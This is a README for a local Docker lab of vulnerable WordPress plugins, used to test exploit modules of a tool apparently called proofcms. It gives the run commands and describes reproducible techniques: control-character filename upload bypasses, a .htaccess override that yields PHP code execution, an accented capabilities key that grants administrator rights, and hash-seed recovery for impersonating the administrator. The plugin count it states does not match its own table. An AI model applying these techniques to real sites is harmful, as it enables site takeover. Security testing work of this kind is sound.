# WordPress vulnerable plugin fixture lab

This loopback-only lab combines three user-supplied historical WordPress plugins. The fixture directories remain on the archive drive and are mounted read-only.

| CVE | Plugin | Fixture |
|---|---|---:|
| CVE-2020-35489 | Contact Form 7 | 5.3.1 |
| CVE-2023-3460 | Ultimate Member | 2.6.6 |
| CVE-2024-28000 | LiteSpeed Cache | 6.3.0.1 |
| CVE-2026-18781 | Drag and Drop Multiple File Upload for CF7 | 1.3.9.8 |

Start WordPress and perform the one-time installation:

```powershell
docker compose up -d --build
docker compose --profile tools run --rm cli core install --url=http://127.0.0.1:9210 --title=ProofCMS --admin_user=admin --admin_password=proofcms-lab-password --admin_email=lab@example.test --skip-email --allow-root
docker compose --profile tools run --rm cli plugin activate contact-form-7 litespeed-cache ultimate-member --allow-root
```

Run all three assessments:

```powershell
python -m proofcms -u http://127.0.0.1:9210 --cms wordpress --cve CVE-2020-35489,CVE-2023-3460,CVE-2024-28000
```

CVE-2024-10924 requires the plugin's 2FA feature to be enabled. The lab uses
`login_protection_enabled=1` with the administrator role enabled for email/TOTP.
The proof only obtains an admin session and reads the dashboard:

```powershell
python -m proofcms -u http://127.0.0.1:9210 --cms wordpress --cve CVE-2024-10924 --run-exploit CVE-2024-10924 --exploit-mode safe --i-understand-authorized
```

CVE-2023-32243 requires both Essential Addons Lite 5.7.1 and the Pro 5.6.2

```powershell
python -m proofcms -u http://127.0.0.1:9210 --cms wordpress --cve CVE-2023-32243 --run-exploit CVE-2023-32243 --exploit-mode aggressive --i-understand-authorized --i-understand-lab-only
```

CVE-2024-28000 uses a 6-character `litespeed.router.hash` generated by
`mt_srand((int)((float)microtime() * 1000000))`. The module can recover the hash
from the 1,000,000-value seed space and use `litespeed_role=1` to impersonate
administrator user 1. This Apache fixture cannot exercise the remote crawler
trigger because the plugin reports `X-LSCACHE: false`, which makes
`Router::can_crawl()` return false. Use the known-hash lab path here:

```powershell
python -m proofcms -u http://127.0.0.1:9210 --cms wordpress --cve CVE-2024-28000 --run-exploit CVE-2024-28000 --exploit-mode aggressive --aggressive-command <6-char-hash> --i-understand-authorized --i-understand-lab-only
```

On a real LiteSpeed/OpenLiteSpeed server the trigger can run, and the module
will attempt the time-bounded seed search automatically.

CVE-2020-35489 has a working aggressive lab PoC. It finds a CF7 form with a
file field, confirms that a plain `.php` filename is rejected, then submits a
control-character filename (`proofcms.php\n.jpg`) that bypasses the 5.3.1
filter. CF7 deletes temporary uploads after submission, so the module reports
`VULNERABLE_UPLOAD_ONLY` rather than claiming persistent execution.

The CF7 probe is version-gated: it runs only when passive detection reports an
affected version. 5.3.2 also accepts the upload but sanitizes the saved name
(`proofcms.php_.jpg`), so the active probe is not a standalone patch
discriminator; use the version result for patched targets.

```powershell
python -m proofcms -u http://127.0.0.1:9210 --cms wordpress --cve CVE-2020-35489 --run-exploit CVE-2020-35489 --exploit-mode aggressive --i-understand-authorized --i-understand-lab-only
```

If automatic form discovery cannot find the page, pass it explicitly:

```powershell
python -m proofcms -u http://127.0.0.1:9210 --cms wordpress --cve CVE-2020-35489 --run-exploit CVE-2020-35489 --exploit-mode aggressive --aggressive-command "http://127.0.0.1:9210/?page_id=22" --i-understand-authorized --i-understand-lab-only
```

CVE-2026-18781 has a working aggressive lab PoC. It requires a public CF7 form
whose `[mfile]` field uses the non-default `filetypes:*` option. The module
finds the rendered `data-type="*"` field, reads the public `ajax_nonce`, and
uploads a control-character filename (`\x01proofcms….pha\x01r`) that the
plugin's extension check accepts but Contact Form 7 later canonicalizes to
`.phar`. It then writes a `.htaccess` override (using the same control-character
trick) that maps `.phar` to PHP, verifies the dynamic PHP proof, and cleans up.

The bypass depends on a modern Contact Form 7 whose
`wpcf7_antiscript_file_name()` strips Unicode control characters. The lab's
baseline fixture is CF7 5.3.1 (needed for CVE-2020-35489), which does not strip
them; this validation was performed with a temporary CF7 5.9.8 install, then the
fixture was restored. Install CF7 5.9.x or newer to reproduce the RCE. Create a
wildcard form and page in the lab:

```powershell
docker compose --profile tools run --rm cli post create --post_type=wpcf7_contact_form --post_title='DND RCE PoC' --post_status=publish --porcelain --allow-root
# set the form body (_form) to: <label>Upload [mfile myfile filetypes:*]</label>[submit "Send"]
# then create a page whose content is: [contact-form-7 id="<form-id>" title="DND RCE PoC"]
```

Run the proof (pass the page explicitly if it is not linked from the homepage):

```powershell
python -m proofcms -u http://127.0.0.1:9210 --cms wordpress --cve CVE-2026-18781 --run-exploit CVE-2026-18781 --exploit-mode aggressive --aggressive-command "http://127.0.0.1:9210/?page_id=28" --i-understand-authorized --i-understand-lab-only
```

The module deletes the `.phar` through the plugin's own delete action and
overwrites the uploaded `.htaccess` with inert content. The plugin cannot unlink
dotfiles, so remove the leftover `proofcms*` folder after the run:

```powershell
docker exec proofcms-wordpress-plugin-fixtures-wordpress-1 sh -c 'rm -rf /var/www/html/wp-content/uploads/wp_dndcf7_uploads/wpcf7-files/proofcms*'
```

Patched 1.3.9.9 refuses both the `.phar` and `.htaccess` uploads and the module
returns `NOT_CONFIRMED`.

CVE-2023-3460 has a working aggressive lab PoC. It registers a uniquely named
account with the accented `wp_càpabilities[administrator]` key, verifies that
the account can access `/wp-admin/` and `/wp-admin/users.php`, and reports the
created username for cleanup:

```powershell
python -m proofcms -u http://127.0.0.1:9210 --cms wordpress --cve CVE-2023-3460 --run-exploit CVE-2023-3460 --exploit-mode aggressive --i-understand-authorized --i-understand-lab-only
```

After the run, remove the reported account:

```powershell
docker compose --profile tools run --rm cli user delete <created_username> --yes --allow-root
```

Remove the disposable database and site with `docker compose down -v`.
